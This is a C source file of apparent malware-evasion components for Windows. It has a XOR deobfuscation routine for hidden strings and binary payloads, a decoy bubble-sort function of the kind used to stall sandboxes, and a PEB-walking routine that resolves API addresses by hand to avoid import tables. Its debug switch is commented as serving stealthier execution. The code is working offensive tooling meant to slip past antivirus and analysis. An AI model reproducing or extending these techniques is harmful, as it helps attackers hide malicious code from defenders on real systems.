#include "evasion.h"
#include <stdio.h>
#include <stdlib.h>

/*
Print debug
Disable debug for stealthier execution in evasion.h
*/
#if DEBUG
void myDebug(DEBUG_TYPE type, const char *format, ...) {
    if (!DEBUG) return;  // Disable debugging if DEBUG is false

    const char *prefix;
    switch (type) {
        case DEBUG_ERROR:
            prefix = "[ERROR]";
            break;
        case DEBUG_INFO:
            prefix = "[INFO]";
            break;
        case DEBUG_SUCCESS:
            prefix = "[SUCCESS]";
            break;
        default:
            prefix = "[INFO]";
            break;
    }

    printf("%s ", prefix);

    va_list args;
    va_start(args, format);
    vprintf(format, args);
    va_end(args);

    printf("\n");  // Ensure new line for readability
}
#endif

unsigned char DECKEY = 144;

char *obfs_decode(unsigned char key, char str[]){
    size_t len = strlen(str);
    char* res = (char*)malloc(len + 1);
    unsigned char curr_key;
    for (int i = 0; i < len; i++){
        curr_key = key * (i + 1);
        while (curr_key == 0 || curr_key == 10 || (curr_key >= 32 && curr_key <= 126))
            curr_key += 47;
        res[i] = str[i] ^ curr_key;
        key = curr_key;
    }
    res[len] = '\0';
    return res;
}

void obfs_decode_binary(unsigned char key, unsigned char *data, size_t len) {
    unsigned char curr_key;
    for (size_t i = 0; i < len; i++) {
        curr_key = key * (i + 1);
        while (curr_key == 0 || curr_key == 10 || (curr_key >= 32 && curr_key <= 126)) {
            curr_key += 47;
        }
        // XORing the ciphertext with the key stream restores the plaintext
        data[i] = data[i] ^ curr_key;
        key = curr_key;
    }
}

void SortNumbers()
{
    int numbers[ARRAY_SIZE];

    // Seed random number generator
    for (int i = 0; i < ARRAY_SIZE; i++)
    {
        numbers[i] = rand() % 10000; // Random number between 0-9999
    }

    // Simple Bubble Sort (Avoids needing qsort from stdlib)
    for (int i = 0; i < ARRAY_SIZE - 1; i++)
    {
        for (int j = 0; j < ARRAY_SIZE - i - 1; j++)
        {
            if (numbers[j] > numbers[j + 1])
            {
                int temp = numbers[j];
                numbers[j] = numbers[j + 1];
                numbers[j + 1] = temp;
            }
        }
    }

    // Compute the average of the sorted array
    long sum = 0;
    for (int i = 0; i < ARRAY_SIZE; i++)
    {
        sum += numbers[i];
    }
    float avg = (float)sum / ARRAY_SIZE;

    // Print final average
    printf("Processed %d numbers. Average value: %.2f", ARRAY_SIZE, avg);
}

pMod GetMod(LPCSTR mod, LPCSTR fn)
{
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    if (!pPEB)
    {
        myDebug(DEBUG_ERROR, "Failed to retrieve PEB.");
        return NULL;
    }

    PPEB_LDR_DATA pLdr = pPEB->Ldr;
    if (!pLdr)
    {
        myDebug(DEBUG_ERROR, "Failed to retrieve LDR data.");
        return NULL;
    }

    LIST_ENTRY *pListHead = &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY *pEntry = pListHead->Flink;

    while (pEntry != pListHead)
    {
        PLDR_DATA_TABLE_ENTRY pDataTable = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!pDataTable->DllBase)
        {
            pEntry = pEntry->Flink;
            continue;
        }

        // Get DLL base address
        HMODULE hModuleBase = (HMODULE)pDataTable->DllBase;
        WCHAR wDllName[MAX_PATH] = {0};
        memcpy(wDllName, pDataTable->FullDllName.Buffer, pDataTable->FullDllName.Length);

        // Convert to ANSI string
        char dllName[MAX_PATH] = {0};
        wcstombs(dllName, wDllName, MAX_PATH);

        // Normalize the name (convert to lowercase)
        for (int i = 0; dllName[i]; i++)
        {
            dllName[i] = tolower(dllName[i]);
        }

        if (strstr(dllName, mod))
        {
            // myDebug(DEBUG_SUCCESS, "Found %s at: %p", mod, hModuleBase);

            // Locate Export Directory
            IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)hModuleBase;
            IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)((BYTE *)hModuleBase + dosHeader->e_lfanew);
            IMAGE_EXPORT_DIRECTORY *expDir = (IMAGE_EXPORT_DIRECTORY *)((BYTE *)hModuleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            if (!expDir)
            {
                myDebug(DEBUG_ERROR, "Export directory not found!");
                return NULL;
            }

            DWORD *names = (DWORD *)((BYTE *)hModuleBase + expDir->AddressOfNames);
            WORD *ordinals = (WORD *)((BYTE *)hModuleBase + expDir->AddressOfNameOrdinals);
            DWORD *functions = (DWORD *)((BYTE *)hModuleBase + expDir->AddressOfFunctions);

            for (DWORD i = 0; i < expDir->NumberOfNames; i++)
            {
                LPCSTR functionName = (LPCSTR)((BYTE *)hModuleBase + names[i]);
                if (strcmp(functionName, fn) == 0)
                {
                    // myDebug(DEBUG_INFO, "%s found at: %p", fn, (BYTE*)hModuleBase + functions[ordinals[i]]);
                    return (pMod)((BYTE *)hModuleBase + functions[ordinals[i]]);
                }
            }

            myDebug(DEBUG_ERROR, "%s not found encoded %s exports.", fn, mod);
            return NULL;
        }

        pEntry = pEntry->Flink;
    }

    myDebug(DEBUG_ERROR, "%s not found encoded PEB.", mod);
    return NULL;
}
